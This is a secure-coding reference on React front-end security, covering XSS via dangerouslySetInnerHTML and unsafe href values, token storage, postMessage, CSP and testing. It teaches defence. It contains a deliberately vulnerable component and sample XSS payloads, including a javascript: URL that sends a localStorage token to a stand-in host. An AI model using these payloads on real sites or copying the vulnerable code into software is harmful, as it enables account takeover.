# React — security

Last reviewed: 2026-11-03

Scope: React 18 and 19 in the browser (SPA with Vite or similar), JavaScript or TypeScript. Next.js has its own reference (`javascript-typescript-nextjs-security.md`). Real security lives in the backend; the front end reduces the XSS and leakage surface.

## Recommendations

- Text in JSX is escaped. Keep external data as text and avoid paths that skip the escaping.
- `dangerouslySetInnerHTML` only with sanitized HTML (e.g. DOMPurify) immediately before use, never with a string coming straight from the API or the URL.
- URLs in `href`, `src`, `action`, and `window.location`: validate the protocol (`https:`, `http:`, `mailto:` as appropriate) with `new URL()`. Do not count on React to block `javascript:`.
- Do not use `eval`, `new Function`, or `setTimeout` with a string over external data.
- Direct DOM access (`ref.current.innerHTML`, `insertAdjacentHTML`, jQuery libraries) brings XSS back; apply the same sanitization rule.
- Secrets: everything in the bundle is public. Variables with an exposure prefix (e.g. `VITE_`) reach the browser. A private API key stays in the backend.
- Session token: prefer an `HttpOnly` cookie set by the backend. A token in `localStorage` is readable by any XSS.
- Authorization in the UI (hiding a button, a protected route in the router) is a convenience. The backend must deny.
- `postMessage`: check `event.origin` against an allowlist before using `event.data`; when sending, pass the target origin, not `'*'`.
- External links with `target="_blank"`: `rel="noopener noreferrer"`.
- A CSP on the server that delivers the app; avoid `unsafe-inline` and `unsafe-eval` when the build allows.
- Dependencies: review component packages that inject HTML (markdown, rich text, editors) and keep the lockfile.

## Common vulnerabilities

- XSS by `dangerouslySetInnerHTML={{ __html: comment }}`.
- XSS by `<a href={profile.site}>` with `javascript:alert(1)`.
- A markdown renderer configured to accept raw HTML.
- A token stolen from `localStorage` by injected script or a compromised dependency.
- A third-party service key embedded in the bundle.
- Open redirect: `window.location = params.get('next')`.
- Sensitive data left in persisted global state (Redux persist) or in console logs.

## Secure implementation

```tsx
import DOMPurify from 'dompurify';

function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw, window.location.origin);
    return ['https:', 'http:', 'mailto:'].includes(url.protocol) ? url.href : undefined;
  } catch {
    return undefined;
  }
}

export function Comment({ html, site }: { html: string; site: string }) {
  const clean = DOMPurify.sanitize(html);
  return (
    <article>
      <div dangerouslySetInnerHTML={{ __html: clean }} />
      <a href={safeHref(site)} target="_blank" rel="noopener noreferrer">site</a>
    </article>
  );
}
```

## Inadequate implementation and risk

```tsx
export function Comment({ html, site }: { html: string; site: string }) {
  return (
    <article>
      <div dangerouslySetInnerHTML={{ __html: html }} />
      <a href={site}>site</a>
    </article>
  );
}
```

Risk: a comment with `<img src=x onerror=...>` runs script for every reader; a site `javascript:fetch('//x?c='+localStorage.token)` executes on click. With a token in `localStorage`, this becomes account takeover.

## Security tests

- Testing Library: render with payloads (`<img src=x onerror=...>`, `<svg onload=...>`) and assert that no `on*` attribute is left in the DOM.
- `safeHref('javascript:alert(1)')` returns `undefined`.
- Search the production bundle for keys and internal URLs that should not be there.
- Protected routes: call the API directly without permission and confirm the backend refuses.
- Optional tools: `eslint-plugin-react` (rules `react/no-danger`, `react/jsx-no-target-blank`), `npm audit`, Semgrep.

## Sources

- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- https://owasp.org/www-project-application-security-verification-standard/
- https://owasp.org/Top10/
- https://react.dev/reference/react-dom/components/common
- https://github.com/cure53/DOMPurify
